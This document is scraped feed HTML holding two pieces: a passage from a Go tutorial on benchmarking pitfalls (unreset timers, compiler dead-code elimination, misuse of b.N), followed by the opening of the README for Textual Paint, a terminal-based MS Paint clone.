the <tt>ints</tt> slice is already sorted, so all subsequent iterations "sort"
a sorted slice. This is not what we want to measure <a href="#footnote-2" id="footnote-reference-2">[2]</a>. The
right measurement would create a new random slice for each iteration:</p>
<div><pre><span></span><span>func</span><span> </span><span>BenchmarkSortInts</span><span>(</span><span>b</span><span> </span><span>*</span><span>testing</span><span>.</span><span>B</span><span>)</span><span> </span><span>{</span><span></span>
<span>  </span><span>for</span><span> </span><span>i</span><span> </span><span>:=</span><span> </span><span>0</span><span>;</span><span> </span><span>i</span><span> </span><span>&lt;</span><span> </span><span>b</span><span>.</span><span>N</span><span>;</span><span> </span><span>i</span><span>++</span><span> </span><span>{</span><span></span>
<span>    </span><span>b</span><span>.</span><span>StopTimer</span><span>()</span><span></span>
<span>    </span><span>ints</span><span> </span><span>:=</span><span> </span><span>makeRandomInts</span><span>(</span><span>N</span><span>)</span><span></span>
<span>    </span><span>b</span><span>.</span><span>StartTimer</span><span>()</span><span></span>
<span>    </span><span>slices</span><span>.</span><span>Sort</span><span>(</span><span>ints</span><span>)</span><span></span>
<span>  </span><span>}</span><span></span>
<span>}</span><span></span>
</pre></div>
<p>On my machine, the second benchmark is almost 100x slower; this makes sense,
because it actually sorts something on each iteration.</p>
</div>
<div id="forgetting-to-reset-the-timer">
<h2>Forgetting to reset the timer</h2>
<p>Note how the benchmarks mentioned above are careful to reset or stop/start
the benchmarking timer around certain operations. This is on purpose, because
the benchmark scaffold measures the run-time of the entire <tt>Benchmark*</tt>
function, executing it many times and dividing the total execution time by
<tt>b.N</tt> (much more details on this process later in the post).</p>
<p>Try it! Remove the <tt>b.StopTimer()</tt> and <tt>b.StartTimer()</tt> calls from the
benchmarking loop in <tt>BenchmarkSortInts</tt> and compare the results - you'll
notice the benchmark now reports noticeably slower per-op execution time
because creating the slices of random integers also happens <tt>b.N</tt> times.</p>
<p>This can throw results off significantly in some cases. Even if we use the
same technique to benchmark two approaches, the errors don't necessarily cancel
out. Due to <a href="https://en.wikipedia.org/wiki/Amdahl%27s_law">Amdahl's law</a> we
can easily report the wrong speed-up when not isolating the computation we
care about.</p>
</div>
<div id="fooled-by-the-compiler">
<h2>Fooled by the compiler</h2>
<p>The trickiest benchmarking pitfall is dealing with compiler optimizations
thwarting our results. The Go compiler doesn't give <tt>Benchmark*</tt> functions
any preferential treatment and will try to optimize them and their contents
just as it would any other Go code <a href="#footnote-3" id="footnote-reference-3">[3]</a>. This produces wrong results and it's
not even easy to know they are wrong! Consider this benchmark:</p>
<div><pre><span></span><span>func</span><span> </span><span>isCond</span><span>(</span><span>b</span><span> </span><span>byte</span><span>)</span><span> </span><span>bool</span><span> </span><span>{</span><span></span>
<span>  </span><span>if</span><span> </span><span>b</span><span>%</span><span>3</span><span> </span><span>==</span><span> </span><span>1</span><span> </span><span>&amp;&amp;</span><span> </span><span>b</span><span>%</span><span>7</span><span> </span><span>==</span><span> </span><span>2</span><span> </span><span>&amp;&amp;</span><span> </span><span>b</span><span>%</span><span>17</span><span> </span><span>==</span><span> </span><span>11</span><span> </span><span>&amp;&amp;</span><span> </span><span>b</span><span>%</span><span>31</span><span> </span><span>==</span><span> </span><span>9</span><span> </span><span>{</span><span></span>
<span>    </span><span>return</span><span> </span><span>true</span><span></span>
<span>  </span><span>}</span><span></span>
<span>  </span><span>return</span><span> </span><span>false</span><span></span>
<span>}</span><span></span>

<span>func</span><span> </span><span>BenchmarkIsCondWrong</span><span>(</span><span>b</span><span> </span><span>*</span><span>testing</span><span>.</span><span>B</span><span>)</span><span> </span><span>{</span><span></span>
<span>  </span><span>for</span><span> </span><span>i</span><span> </span><span>:=</span><span> </span><span>0</span><span>;</span><span> </span><span>i</span><span> </span><span>&lt;</span><span> </span><span>b</span><span>.</span><span>N</span><span>;</span><span> </span><span>i</span><span>++</span><span> </span><span>{</span><span></span>
<span>    </span><span>isCond</span><span>(</span><span>201</span><span>)</span><span></span>
<span>  </span><span>}</span><span></span>
<span>}</span><span></span>
</pre></div>
<p>We're trying to benchmark the <tt>isCond</tt> function, but the compiler is
fooling us (at least in recent Go versions):</p>
<div><pre><span></span>BenchmarkIsCondWrong-8        1000000000     0.2401 ns/op
</pre></div>
<p>Sub-nanosecond operation times are always a bit suspect, although not entirely
out of the question given the simplicity of the <tt>isCond</tt> function. There are
two serious errors here, however:</p>
<ol>
<li>We use a constant input to <tt>isCond</tt>; since <tt>isCond</tt> is a simple function
that is likely to be inlined into the benchmark function, the compiler can
theoretically constant-propagate its input through its contents and replace
the code with the compile-time computed answer.</li>
<li>Even if we used a non-constant for the input, the result of <tt>isCond</tt> is
unused, so the compiler may optimize it away.</li>
</ol>
<p>And in fact, in this example the contents of the benchmark loop are optimized
away entirely; looking at the disassembly, we see this:</p>
<div><pre><span></span>    JMP     BenchmarkIsCondWrong_pc7
BenchmarkIsCondWrong_pc4:
    INCQ    CX
BenchmarkIsCondWrong_pc7:
    CMPQ    416(AX), CX
    JGT     BenchmarkIsCondWrong_pc4
    RET
</pre></div>
<p><tt>CX</tt> holds <tt>i</tt>, and <tt>416(AX)</tt> accesses <tt>b.N</tt>. This is just an empty
loop! Now the 0.24 nanoseconds per iteration make sense <a href="#footnote-4" id="footnote-reference-4">[4]</a>.</p>
<p>Here's an even more confounding manifestation of the same problem:</p>
<div><pre><span></span><span>func</span><span> </span><span>countCond</span><span>(</span><span>b</span><span> </span><span>[]</span><span>byte</span><span>)</span><span> </span><span>int</span><span> </span><span>{</span><span></span>
<span>  </span><span>result</span><span> </span><span>:=</span><span> </span><span>0</span><span></span>
<span>  </span><span>for</span><span> </span><span>i</span><span> </span><span>:=</span><span> </span><span>0</span><span>;</span><span> </span><span>i</span><span> </span><span>&lt;</span><span> </span><span>len</span><span>(</span><span>b</span><span>);</span><span> </span><span>i</span><span>++</span><span> </span><span>{</span><span></span>
<span>    </span><span>if</span><span> </span><span>isCond</span><span>(</span><span>b</span><span>[</span><span>i</span><span>])</span><span> </span><span>{</span><span></span>
<span>      </span><span>result</span><span>++</span><span></span>
<span>    </span><span>}</span><span></span>
<span>  </span><span>}</span><span></span>
<span>  </span><span>return</span><span> </span><span>result</span><span></span>
<span>}</span><span></span>

<span>func</span><span> </span><span>BenchmarkCountWrong</span><span>(</span><span>b</span><span> </span><span>*</span><span>testing</span><span>.</span><span>B</span><span>)</span><span> </span><span>{</span><span></span>
<span>  </span><span>inp</span><span> </span><span>:=</span><span> </span><span>getInputContents</span><span>()</span><span></span>
<span>  </span><span>b</span><span>.</span><span>ResetTimer</span><span>()</span><span></span>
<span>  </span><span>for</span><span> </span><span>i</span><span> </span><span>:=</span><span> </span><span>0</span><span>;</span><span> </span><span>i</span><span> </span><span>&lt;</span><span> </span><span>b</span><span>.</span><span>N</span><span>;</span><span> </span><span>i</span><span>++</span><span> </span><span>{</span><span></span>
<span>    </span><span>countCond</span><span>(</span><span>inp</span><span>)</span><span></span>
<span>  </span><span>}</span><span></span>
<span>}</span><span></span>

<span>func</span><span> </span><span>getInputContents</span><span>()</span><span> </span><span>[]</span><span>byte</span><span> </span><span>{</span><span></span>
<span>  </span><span>n</span><span> </span><span>:=</span><span> </span><span>400000</span><span></span>
<span>  </span><span>buf</span><span> </span><span>:=</span><span> </span><span>make</span><span>([]</span><span>byte</span><span>,</span><span> </span><span>n</span><span>)</span><span></span>
<span>  </span><span>for</span><span> </span><span>i</span><span> </span><span>:=</span><span> </span><span>0</span><span>;</span><span> </span><span>i</span><span> </span><span>&lt;</span><span> </span><span>n</span><span>;</span><span> </span><span>i</span><span>++</span><span> </span><span>{</span><span></span>
<span>    </span><span>buf</span><span>[</span><span>i</span><span>]</span><span> </span><span>=</span><span> </span><span>byte</span><span>(</span><span>n</span><span> </span><span>%</span><span> </span><span>32</span><span>)</span><span></span>
<span>  </span><span>}</span><span></span>
<span>  </span><span>return</span><span> </span><span>buf</span><span></span>
<span>}</span><span></span>
</pre></div>
<p>Now there are certainly no constant propagation issues, and the result of
<tt>isCond</tt> is clearly used inside <tt>countCond</tt>. But we've committed the same
error! While the result of <tt>isCond</tt> is used, the result of <tt>countCond</tt> is
not, and therefore the compiler will do something like:</p>
<ul>
<li>Inline <tt>isCond</tt> into <tt>countCond</tt></li>
<li>Inline <tt>countCond</tt> into the benchmark function</li>
<li>Realize that the loop body in <tt>coundCond</tt> isn't producing side effects or
any result used outside it</li>
<li>Hollow out the loop body in <tt>countCond</tt>, leaving only an empty loop</li>
</ul>
<p>This process results in confusing benchmark results because the loop
remains in place, and thus if we grow the input, the benchmarked execution
time will grow accordingly! One of the oldest tricks in the benchmarking book is
to change the input size and observe how the run-time is affected; if it's not
moving, something is wrong. If it's growing roughly in line with the asymptotic
complexity of the code under test, it's at least passing a simple smoke test.
But in this case the heuristic fails due to the specific optimizations
performed.</p>
<div id="keeping-compiler-optimizations-in-benchmarks-under-control">
<h3>Keeping compiler optimizations in benchmarks under control</h3>
<p>There are two main techniques in Go to thwart compiler optimizations where we
don't want them.</p>
<p>The first is using the <a href="https://pkg.go.dev/runtime#KeepAlive">runtime.KeepAlive</a>
function. Originally introduced for fine-grained control of finalizers, it's
also useful as a very-low-overhead way to tell the compiler "I really need this
value, even if you can prove I do not". Here's how we can fix our <tt>countCond</tt>
benchmark with its help:</p>
<div><pre><span></span><span>func</span><span> </span><span>BenchmarkCountKeepAlive</span><span>(</span><span>b</span><span> </span><span>*</span><span>testing</span><span>.</span><span>B</span><span>)</span><span> </span><span>{</span><span></span>
<span>  </span><span>inp</span><span> </span><span>:=</span><span> </span><span>getInputContents</span><span>()</span><span></span>
<span>  </span><span>b</span><span>.</span><span>ResetTimer</span><span>()</span><span></span>
<span>  </span><span>result</span><span> </span><span>:=</span><span> </span><span>0</span><span></span>
<span>  </span><span>for</span><span> </span><span>i</span><span> </span><span>:=</span><span> </span><span>0</span><span>;</span><span> </span><span>i</span><span> </span><span>&lt;</span><span> </span><span>b</span><span>.</span><span>N</span><span>;</span><span> </span><span>i</span><span>++</span><span> </span><span>{</span><span></span>
<span>    </span><span>result</span><span> </span><span>+=</span><span> </span><span>countCond</span><span>(</span><span>inp</span><span>)</span><span></span>
<span>  </span><span>}</span><span></span>
<span>  </span><span>runtime</span><span>.</span><span>KeepAlive</span><span>(</span><span>result</span><span>)</span><span></span>
<span>}</span><span></span>
</pre></div>
<p>Running the benchmark makes it clear that there's more work going into each
iteration now:</p>
<div><pre><span></span>BenchmarkCountWrong-8                 12481       95911 ns/op
BenchmarkCountKeepAlive-8              4143      285527 ns/op
</pre></div>
<p>Another way is without needing a special function, but is slightly more
dangerous; we can use a global exported value to collect the result:</p>
<div><pre><span></span><span>var</span><span> </span><span>Sink</span><span> </span><span>int</span><span></span>

<span>func</span><span> </span><span>BenchmarkCountSink</span><span>(</span><span>b</span><span> </span><span>*</span><span>testing</span><span>.</span><span>B</span><span>)</span><span> </span><span>{</span><span></span>
<span>  </span><span>inp</span><span> </span><span>:=</span><span> </span><span>getInputContents</span><span>()</span><span></span>
<span>  </span><span>b</span><span>.</span><span>ResetTimer</span><span>()</span><span></span>
<span>  </span><span>for</span><span> </span><span>i</span><span> </span><span>:=</span><span> </span><span>0</span><span>;</span><span> </span><span>i</span><span> </span><span>&lt;</span><span> </span><span>b</span><span>.</span><span>N</span><span>;</span><span> </span><span>i</span><span>++</span><span> </span><span>{</span><span></span>
<span>    </span><span>Sink</span><span> </span><span>+=</span><span> </span><span>countCond</span><span>(</span><span>inp</span><span>)</span><span></span>
<span>  </span><span>}</span><span></span>
<span>}</span><span></span>
</pre></div>
<p>Even though our benchmark doesn't use <tt>Sink</tt>, it's very difficult for the
compiler to eliminate because it's a package-level exported value that can be
used pretty much anywhere in the program. I did say it's slightly more
dangerous, though, because theoretically the compiler <em>could</em> prove it's
redundant using more sophisticated cross-package analysis.</p>
<p>Which brings us the to ultimate point: when in doubt, always double check the
assembly generated for the benchmark function, and ensure that the compiler
wasn't too clever.</p>
</div>
<div id="ongoing-work-in-the-go-standard-library">
<h3>Ongoing work in the Go standard library</h3>
<p>Addressing the issue of compiler optimizations in benchmarks is something the Go
team is interested in. There are currently two active proposals in discussion:</p>
<ul>
<li><a href="https://github.com/golang/go/issues/61179">Issue 61179</a>: adding a
low-overhead "keep this value" function in the <tt>testing</tt> package; this would
be similar to <tt>runtime.KeepAlive</tt>, but more targeted at benchmarks with
a better name and clearer guarantees.</li>
<li>A more ambitious proposal in <a href="https://github.com/golang/go/issues/61515">issue 61515</a> discusses changing the main
benchmarking API of the <tt>testing</tt> package to facilitate safer benchmarking.</li>
</ul>
</div>
</div>
<div id="misusing-b-n">
<h2>Misusing <tt>b.N</tt></h2>
<p>There are at least two common ways to misuse the benchmark repetition indicator
<tt>b.N</tt>. Here's the first, completely forgetting the loop:</p>
<div><pre><span></span><span>import</span><span> </span><span>(</span><span></span>
<span>  </span><span>"crypto/rand"</span><span></span>
<span>  </span><span>"testing"</span><span></span>
<span>)</span><span></span>

<span>func</span><span> </span><span>BenchmarkRandPrimeWrongNoLoop</span><span>(</span><span>b</span><span> </span><span>*</span><span>testing</span><span>.</span><span>B</span><span>)</span><span> </span><span>{</span><span></span>
<span>  </span><span>rand</span><span>.</span><span>Prime</span><span>(</span><span>rand</span><span>.</span><span>Reader</span><span>,</span><span> </span><span>200</span><span>)</span><span></span>
<span>}</span><span></span>
</pre></div>
<p>From proper measurements, the <tt>crypto/rand.Prime</tt> invocation with length 200
should take around 1 ms on my machine, but this benchmark reports impossibly
low times - fractions of a nanosecond.</p>
<p>The second is trickier:</p>
<div><pre><span></span><span>func</span><span> </span><span>BenchmarkRandPrimeWrongUseI</span><span>(</span><span>b</span><span> </span><span>*</span><span>testing</span><span>.</span><span>B</span><span>)</span><span> </span><span>{</span><span></span>
<span>  </span><span>for</span><span> </span><span>i</span><span> </span><span>:=</span><span> </span><span>0</span><span>;</span><span> </span><span>i</span><span> </span><span>&lt;</span><span> </span><span>b</span><span>.</span><span>N</span><span>;</span><span> </span><span>i</span><span>++</span><span> </span><span>{</span><span></span>
<span>    </span><span>rand</span><span>.</span><span>Prime</span><span>(</span><span>rand</span><span>.</span><span>Reader</span><span>,</span><span> </span><span>i</span><span>)</span><span></span>
<span>  </span><span>}</span><span></span>
<span>}</span><span></span>
</pre></div>
<p>Note how it's using <tt>i</tt> in each iteration (and thus indirectly <tt>b.N</tt>). On my
machine, this benchmark <strong>doesn't terminate</strong>; what gives?</p>
<p>To understand what's going on here, we should first discuss how benchmarking in
Go works in a bit more detail. The benchmarking harness invokes our benchmark
functions several times. How many? This can be
determined by flags like <tt><span>-benchtime</span></tt>, but the default is for one second.
How does the harness know how many repetitions to pass to our benchmark function
in order to get 1s of execution time? By trying it with low repetitions first,
measuring how long it takes, and then running with increasingly high repetitions
until the intended duration is reached <a href="#footnote-5" id="footnote-reference-5">[5]</a>.</p>
<p>There are some nuances to the process: e.g. the number of repetitions doesn't
grow too fast between attempts (at most 100x, as of Go 1.21), and it is capped
at 1 billion. The key point is that it uses the execution time from the
previous attempt to determine how many repetitions to run next.</p>
<p>With these insights in mind, let's examine the two misuses shown above.</p>
<ol>
<li>Forgetting to loop until <tt>b.N</tt>. Each benchmark invocation only performs the
tested operations once. No matter how many times the benchmark harness
repeats the benchmark with increasing <tt>b.N</tt>, the function takes a
millisecond to run! Therefore, eventually the benchmark harness hits its
<tt>N</tt> limit of a billion invocations, and divides the execution time (1 ms)
by this <tt>N</tt> to get a nonsensical result.</li>
<li>Using the value of <tt>b.N</tt> for something other than "how many times to
repeat the benchmark". <tt>rand.Prime</tt> is very fast when its input length
is small, but gets pretty slow for large inputs. The harness starts by
running the function once to get its bearings, and then 100 times. For size
100 the run-time of <tt>rand.Prime</tt> is moderate, so the next time the harness
can increase <tt>b.N</tt> by another factor of 100. But for higher inputs,
<tt>rand.Prime</tt> also takes much longer. We end up with a quadratic run-time
explosion! Our benchmark function isn't literally hanging - it <em>will</em> finish
eventually, but it may take long minutes or hours.</li>
</ol>
<p>It's worth mentioning that the proposal in <a href="https://github.com/golang/go/issues/61515">issue 61515</a> would address this problem as
well, by exposing a benchmarking API that would be much harder to misuse in this
way. Another proposal that may affect this is <a href="https://github.com/golang/go/issues/61405">add range over int</a>, which will permit us to write
<tt>for range b.N</tt> to iterate exactly <tt>b.N</tt> times, without an explicit
iteration variable.</p>
<hr>
<table id="footnote-1">
<colgroup><col><col></colgroup>
<tbody>
<tr><td><a href="#footnote-reference-1">[1]</a></td><td><p>For background on this work and why the new generic sorting functions
are faster, see <a href="https://eli.thegreenplace.net/2022/faster-sorting-with-go-generics/">this post</a>.</p>
<p>If you're reading this before Go 1.21's final release (in Aug 2023),
you can download the
<a href="https://go.dev/blog/go1.21rc">release candidate</a> or use
<a href="https://pkg.go.dev/golang.org/dl/gotip">gotip</a>.</p>
</td></tr>
</tbody>
</table>
<table id="footnote-2">
<colgroup><col><col></colgroup>
<tbody>
<tr><td><a href="#footnote-reference-2">[2]</a></td><td>To be clear, it's also important to know how well sorting algorithms
perform on sorted or almost-sorted inputs, but here we're talking about
the more general case.</td></tr>
</tbody>
</table>
<table id="footnote-3">
<colgroup><col><col></colgroup>
<tbody>
<tr><td><a href="#footnote-reference-3">[3]</a></td><td>While it's possible to think of ways to treat <tt>Benchmark*</tt> specially,
it's pretty hard to do it correctly because we very much <em>want</em> the
compiler to optimize the functions we're benchmarking. After all, we
want to know what their real run-time is. Drawing the line
between "optimize here" and "don't touch there" is tricky!</td></tr>
</tbody>
</table>
<table id="footnote-4">
<colgroup><col><col></colgroup>
<tbody>
<tr><td><a href="#footnote-reference-4">[4]</a></td><td>The Go compiler doesn't currently optimize loops entirely away, unless
it can prove they terminate.</td></tr>
</tbody>
</table>
<table id="footnote-5">
<colgroup><col><col></colgroup>
<tbody>
<tr><td><a href="#footnote-reference-5">[5]</a></td><td>This also has the side effect of providing whatever <em>warming</em> the
benchmark needs w.r.t. caches (CPU caches, paged memory, file system
caches, DNS caches, etc).</td></tr>
</tbody>
</table>
</div>

            </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Textual Paint ‚Äì MS Paint in your terminal (173 pts)]]></title>
            <link>https://github.com/1j01/textual-paint</link>
            <guid>36859880</guid>
            <pubDate>Tue, 25 Jul 2023 09:20:50 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/1j01/textual-paint">https://github.com/1j01/textual-paint</a>, See on <a href="https://news.ycombinator.com/item?id=36859880">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">Textual Paint</h2>
<p dir="auto">MS Paint in your terminal.</p>
<p dir="auto">This is a TUI (Text User Interface) image editor, inspired by MS Paint, built with <a href="https://textual.textualize.io/" rel="nofollow">Textual</a>.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/1j01/textual-paint/v0.1.0/screenshot.svg"><img src="https://raw.githubusercontent.com/1j01/textual-paint/v0.1.0/screenshot.svg" alt="MS Paint like interface"></a></p>
<h2 tabindex="-1" dir="auto">Features</h2>
<ul>
<li> Open and save images
<ul>
<li> Fancy file dialogs</li>
<li> Drag and drop files to open</li>
<li> Warnings when overwriting an existing file, or closing with unsaved changes</li>
<li> Auto-saves a temporary <code>.ans~</code> backup file alongside the file you're editing, for crash recovery</li>
<li> Edits ANSI art and raster images and more. See <a href="#file-formats">File Formats</a></li>
</ul>
</li>
<li> All tools from MS Paint: Free-Form Select, Select, Eraser/Color Eraser, Fill With Color, Pick Color, Magnifier, Pencil, Brush, Airbrush, Text, Line, Curve, Rectangle, Polygon, Ellipse, and Rounded Rectangle</li>
<li> Color palette</li>
<li> Efficient screen updates and undo/redo history, by tracking regions affected by each action</li>
<li> You should be able to use this over SSH</li>
<li> Brush previews</li>
<li> Status bar</li>
<li> Menu bar</li>
<li> Keyboard shortcuts</li>
<li> Nearly every command from MS Paint is supported, including fun ones like:
<ul>
<li> Flip/Rotate</li>
<li> Stretch/Skew</li>
<li> Edit Colors</li>
<li> Set As Wallpaper (Tiled/Centered)</li>
</ul>
</li>
<li> Localization into 26 languages: Arabic, Czech, Danish, German, Greek, English, Spanish, Finnish, French, Hebrew, Hungarian, Italian, Japanese, Korean, Dutch, Norwegian, Polish, Portuguese, Brazilian Portuguese, Russian, Slovak, Slovenian, Swedish, Turkish, Chinese, Simplified Chinese</li>
<li> Dark mode</li>
<li> Zooming works with text, despite running in the terminal :)</li>
</ul>
<h2 tabindex="-1" dir="auto">Usage</h2>
<p dir="auto">Python 3.10 or later is required. See <a href="#compatibility">Compatibility</a> for details on terminals supported.</p>
<h3 tabindex="-1" dir="auto">Installation</h3>
<div dir="auto" data-snippet-clipboard-copy-content="pip install textual-paint"><pre>pip install textual-paint</pre></div>
<h3 tabindex="-1" dir="auto">Running</h3>

<h3 tabindex="-1" dir="auto">Command Line Options</h3>
<div data-snippet-clipboard-copy-content="$ textual-paint --help
usage: textual-paint [options] [filename]

Paint in the terminal.

positional arguments:
  filename              Path to a file to open. File will be created if it
                        doesn't exist.

options:
  -h, --help            show this help message and exit
  --version             show program's version number and exit
  --theme {light,dark}  Theme to use, either &quot;light&quot; or &quot;dark&quot;
  --language {ar,cs,da,de,el,en,es,fi,fr,he,hu,it,ja,ko,nl,no,pl,pt,pt-br,ru,sk,sl,sv,tr,zh,zh-simplified}
                        Language to use
  --ascii-only-icons    Use only ASCII characters for tool icons, no emoji or
                        other Unicode symbols
  --backup-folder FOLDER
                        Folder to save backups to. By default a backup is saved
                        alongside the edited file.
  --inspect-layout      Enables DOM inspector (F12) and middle click highlight,
                        for development
  --clear-screen        Clear the screen before starting; useful for
                        development, to avoid seeing outdated errors
  --restart-on-changes  Restart the app when the source code is changed, for
                        development
  --recode-samples      Open and save each file in samples/, for testing"><pre><code>$ textual-paint --help
usage: textual-paint [options] [filename]

Paint in the terminal.

positional arguments:
  filename              Path to a file to open. File will be created if it
                        doesn't exist.

options:
  -h, --help            show this help message and exit
  --version             show program's version number and exit
  --theme {light,dark}  Theme to use, either "light" or "dark"
  --language {ar,cs,da,de,el,en,es,fi,fr,he,hu,it,ja,ko,nl,no,pl,pt,pt-br,ru,sk,sl,sv,tr,zh,zh-simplified}
                        Language to use
  --ascii-only-icons    Use only ASCII characters for tool icons, no emoji or
                        other Unicode symbols
  --backup-folder FOLDER
                        Folder to save backups to. By default a backup is saved
                        alongside the edited file.
  --inspect-layout      Enables DOM inspector (F12) and middle click highlight,
                        for development
  --clear-screen        Clear the screen before starting; useful for
                        development, to avoid seeing outdated errors
  --restart-on-changes  Restart the app when the source code is changed, for
                        development
  --recode-samples      Open and save each file in samples/, for testing
</code></pre></div>
<h3 tabindex="-1" dir="auto">Keyboard Shortcuts</h3>
<ul dir="auto">
<li><kbd>Ctrl</kbd>+<kbd>D</kbd>: Toggle Dark Mode</li>
<li><kbd>Ctrl</kbd>+<kbd>Q</kbd>: Quit</li>
<li><kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>S</kbd>: Save As <strong>IF SHIFT IS DETECTED</strong> ‚Äî <g-emoji alias="warning" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/26a0.png">‚ö†Ô∏è</g-emoji> it might trigger Save instead, and overwrite the open file!</li>
<li><kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>Z</kbd>: Redo <strong>IF SHIFT IS DETECTED</strong> ‚Äî <g-emoji alias="warning" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/26a0.png">‚ö†Ô∏è</g-emoji> it might trigger Undo instead.</li>
</ul>
<p dir="auto">The rest match MS Paint's keyboard shortcuts:</p>
<ul dir="auto">
<li><kbd>Ctrl</kbd>+<kbd>S</kbd>: Save</li>
<li><kbd>Ctrl</kbd>+<kbd>O</kbd>: Open</li>
<li><kbd>Ctrl</kbd>+<kbd>N</kbd>: New</li>
<li><kbd>Ctrl</kbd>+<kbd>T</kbd>: Toggle Tools Box</li>
<li><kbd>Ctrl</kbd>+<kbd>W</kbd>: Toggle Colors Box</li>
<li><kbd>Ctrl</kbd>+<kbd>Z</kbd>: Undo</li>
<li><kbd>Ctrl</kbd>+<kbd>Y</kbd>: Redo</li>
<li><kbd>F4</kbd>: Redo</li>
<li><kbd>Ctrl</kbd>+<kbd>A</kbd>: Select All</li>
<li><kbd>Delete</kbd>: Clear Selection</li>
<li><kbd>Ctrl</kbd>+<kbd>C</kbd>: Copy</li>
<li><kbd>Ctrl</kbd>+<kbd>V</kbd>: Paste</li>
<li><kbd>Ctrl</kbd>+<kbd>X</kbd>: Cut</li>
<li><kbd>Ctrl</kbd>+<kbd>E</kbd>: Image Attributes</li>
<li><kbd>Ctrl</kbd>+<kbd>PageUp</kbd>: Large Size</li>
<li><kbd>Ctrl</kbd>+<kbd>PageDown</kbd>: Normal Size</li>
</ul>
<h3 tabindex="-1" dir="auto">File Formats</h3>
<p dir="auto">Many file formats are supported, including ANSI art, raster images, SVG and HTML.</p>
<p dir="auto">To choose a file format when saving, type its file extension. For example, to save a PNG, add <code>.png</code> to the end of the filename. The default is <code>.ans</code>.</p>
<table>
<thead>
<tr>
<th>Format</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>ANSI</strong> (.ans)</td>
<td>Note that while it handles many more ANSI control codes when loading than those that it uses to save files, you may have limited success loading other ANSI files that you find on the web, or create with other tools. ANSI files can vary a lot and even encode animations!</td>
</tr>
<tr>
<td><strong>mIRC codes</strong> (.irc, .mirc)</td>
<td>invented file extensions, and not to be confused with .mrc mIRC script files</td>
</tr>
<tr>
<td><strong>Plain Text</strong> (.txt)</td>
<td></td>
</tr>
<tr>
<td><strong>SVG</strong> (.svg)</td>
<td>can open SVGs saved by Textual Paint, which embed ANSI data; can also open some other SVGs that consist of a grid of rectangles and text elements. For fun, as a challenge, I made it quite flexible; it can handle uneven grids of unsorted rectangles. But that's only used as a fallback, because it's not perfect.</td>
</tr>
<tr>
<td><strong>HTML</strong> (.htm, html)</td>
<td>write-only (opening not supported)</td>
</tr>
<tr>
<td><strong>PNG</strong> (.png)</td>
<td>opens first frame of an APNG file</td>
</tr>
<tr>
<td><strong>Bitmap</strong> (.bmp)</td>
<td></td>
</tr>
<tr>
<td><strong>GIF</strong> (.gif)</td>
<td>opens first frame</td>
</tr>
<tr>
<td><strong>TIFF</strong> (.tiff)</td>
<td>opens first frame</td>
</tr>
<tr>
<td><strong>WebP</strong> (.webp)</td>
<td>opens first frame</td>
</tr>
<tr>
<td><strong>JPEG</strong> (.jpg, .jpeg)</td>
<td>saving disabled because it's lossy (it would destroy your pixel art)</td>
</tr>
<tr>
<td><strong>Windows Icon</strong> (.ico)</td>
<td>opens largest size in the file</td>
</tr>
<tr>
<td><strong>Mac OS Icon</strong> (.icns)</td>
<td>opens largest size in the file; saving disabled because it requires specific sizes</td>
</tr>
<tr>
<td><strong>Windows Cursor</strong> (.cur)</td>
<td>opens largest size in the file; saving not supported by Pillow (and it would need a defined hot spot)</td>
</tr>
</tbody>
</table>
<p dir="auto">See <a href="https://pillow.readthedocs.io/en/stable/handbook/image-file-formats.html" rel="nofollow">Pillow's documentation</a> for more supported formats.</p>
<p dir="auto">Note that metadata is not preserved when opening and saving image files. This is however common for many image editors.</p>
<h3 tabindex="-1" dir="auto">Tips</h3>
<p dir="auto">You can draw with a character by clicking the selected color display area in the palette and then typing the character,
or by double clicking the same area to pick a character from a list.</p>
<p dir="auto">You can set the text color by holding Ctrl while clicking a color in the palette, or while double clicking a color to open the Edit Colors dialog.</p>
<p dir="auto">You can display a saved ANSI file in the terminal with <code>cat</code>:</p>

<p dir="auto">To view all the sample files, run:</p>
<div dir="auto" data-snippet-clipboard-copy-content="find samples -type f -exec file --mime-type {} \; | grep -v -e &quot;image/png&quot; -e &quot;image/svg&quot; | cut -d: -f1 | sort | xargs -I{} sh -c 'echo &quot;File: {}&quot;; cat &quot;{}&quot;; echo &quot;\n-----------------------\n&quot;'"><pre>find samples -type f -exec file --mime-type {} <span>\;</span> <span>|</span> grep -v -e <span><span>"</span>image/png<span>"</span></span> -e <span><span>"</span>image/svg<span>"</span></span> <span>|</span> cut -d: -f1 <span>|</span> sort <span>|</span> xargs -I{} sh -c <span><span>'</span>echo "File: {}"; cat "{}"; echo "\n-----------------------\n"<span>'</span></span></pre></div>
<details>
<summary>Command Explanation</summary>
Let's break down the command:
<ol dir="auto">
<li>
<p dir="auto"><code>find samples -type f -exec file --mime-type {} \;</code>: This part uses the <code>find</code> command to locate all files (<code>-type f</code>) within the "samples" folder and its subdirectories. For each file, it executes the <code>file --mime-type</code> command to determine the file's MIME type. This outputs a line like "samples/ship.ans: text/plain".</p>
</li>
<li>
<p dir="auto"><code>grep -v -e "image/png" -e "image/svg"</code>: This filters out any lines containing the MIME types "image/png" or "image/svg", effectively excluding PNG and SVG files. <code>-v</code> means "invert the match", so it will only output lines that don't match the given patterns.</p>
</li>
<li>
<p dir="auto"><code>cut -d: -f1</code>: This extracts only the file paths from the output of the <code>file</code> command, removing the MIME type information.</p>
</li>
<li>
<p dir="auto"><code>sort</code>: This sorts the file paths alphabetically.</p>
</li>
<li>
<p dir="auto"><code>xargs -I{} sh -c 'echo "File: {}"; cat "{}"; echo "\n-----------------------\n"'</code>: Finally, this executes the <code>sh -c</code> command for each file, echoing the filename, catting its content, and adding a separator line.</p>
</li>
</ol>
<p dir="auto">This command will sort and display the content of all non-PNG files within the "samples" folder and its subdirectories. Remember to run this command in the directory where the "samples" folder is located.</p>
</details>
<p dir="auto">To preview ANSI art files in file managers like Nautilus, Thunar, Nemo, or Caja, you can install the <a href="https://github.com/1j01/ansi-art-thumbnailer">ansi-art-thumbnailer</a> program I made to go along with this project.</p>
